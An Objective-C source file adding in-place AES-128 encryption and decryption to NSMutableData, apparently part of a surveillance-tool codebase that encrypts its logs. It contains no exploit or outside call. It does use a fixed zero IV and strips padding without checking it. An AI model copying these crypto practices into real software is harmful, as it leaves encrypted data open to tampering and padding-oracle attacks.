/*
 * NSMutableData AES128 Category
 *  This is a category for NSMutableData in order to provide in-place encryption
 *  capabilities
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 08/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "NSMutableData+AES128.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


@implementation NSMutableData (AES128)

- (CCCryptorStatus)__encryptWithKey: (NSData *)aKey
{
  //no padding on aligned block: only for logs
  int pad = [self length];
  int outLen = 0;
  BOOL needsPadding = YES;
  
#ifdef DEBUG_MUTABLE_AES
  infoLog(@"self length: %d", [self length]);
#endif
  
  if ([self length] % kCCBlockSizeAES128)
    {
      pad = ([self length] + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - [self length];
      [self increaseLengthBy: pad];
      
      outLen        = [self length];
      needsPadding  = YES;
    }
  else
    {
      pad           = 0;
      outLen        = [self length];
      needsPadding  = NO;
    }
  
#ifdef DEBUG_MUTABLE_AES
  infoLog(@"outLen: %d", outLen);
  infoLog(@"pad: %d", pad);
#endif
  
  //
  // encrypts in-place since this is a mutable data object
  //
  size_t numBytesEncrypted = 0;
  CCCryptorStatus result;
  
  if (needsPadding == YES)
    {
      result = CCCrypt(kCCEncrypt, 
                       kCCAlgorithmAES128, 
                       kCCOptionPKCS7Padding,
                       [aKey bytes], 
                       kCCKeySizeAES128,
                       NULL,                                      // initialization vector (optional)
                       [self mutableBytes], [self length] - pad,  // input
                       [self mutableBytes], outLen,               // output
                       &numBytesEncrypted);
    }
  else
    {
      result = CCCrypt(kCCEncrypt, 
                       kCCAlgorithmAES128, 
                       0,
                       [aKey bytes], 
                       kCCKeySizeAES128,
                       NULL,                                      // initialization vector (optional)
                       [self mutableBytes], [self length] - pad,  // input
                       [self mutableBytes], outLen,               // output
                       &numBytesEncrypted);
    }
  
  return result;
}

-(void)doPKCS7Padding:(uint)pad
{
  if (pad > 0)
    {
      [self increaseLengthBy: pad];
      
      char *buff  = (char*)[self bytes];
      char *ptr   = buff + [self length] - pad;
      
      // do ourself pkcs5/7 padding
      for (int i=0; i < pad; i++) 
        {
          *ptr = pad;
          ptr++;
        }
    }
}

- (CCCryptorStatus)encryptWithKey: (NSData *)aKey
{
  int pad = kCCBlockSizeAES128;
  size_t numBytesEncrypted = 0;
  
  if ([self length] % kCCBlockSizeAES128)
    pad = kCCBlockSizeAES128 - [self length] & (kCCBlockSizeAES128 - 1);
  
  [self doPKCS7Padding: pad];
  
  // padding ourself
  CCCryptorStatus result = 
                  CCCrypt(kCCEncrypt, 
                          kCCAlgorithmAES128, 
                          0,
                          [aKey bytes], 
                          kCCKeySizeAES128,
                          NULL,                                  // initialization vector (optional)
                          [self mutableBytes], [self length],    // input
                          [self mutableBytes], [self length],    // output
                          &numBytesEncrypted);
  
  return result;
}


- (CCCryptorStatus)decryptWithKey: (NSData *)aKey
{
#ifdef DEBUG_MUTABLE_AES
  NSLog(@"self length: %d", [self length]);
#endif
  
  //
  // decrypts in-place since this is a mutable data object
  //
  size_t numBytesDecrypted = 0;
  CCCryptorStatus result = CCCrypt(kCCDecrypt, 
                                   kCCAlgorithmAES128, 
                                   0,
                                   [aKey bytes], 
                                   kCCKeySizeAES128,
                                   NULL,                                // initialization vector (optional)
                                   [self mutableBytes], [self length],  // input
                                   [self mutableBytes], [self length],  // output
                                   &numBytesDecrypted);
  
  return result;
}

- (void)removePadding
{
  // remove padding
  char bytesOfPadding;
  @try
    {
      [self getBytes: &bytesOfPadding
               range: NSMakeRange([self length] - 1, sizeof(char))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_MUTABLE_AES
      errorLog(@"Exception on getbytes (%@)", [e reason]);
#endif
      return;
    }
  
  
#ifdef DEBUG_MUTABLE_AES
  infoLog(@"byte: %d", bytesOfPadding);
#endif
  
  [self setLength: [self length] - bytesOfPadding];
}

@end
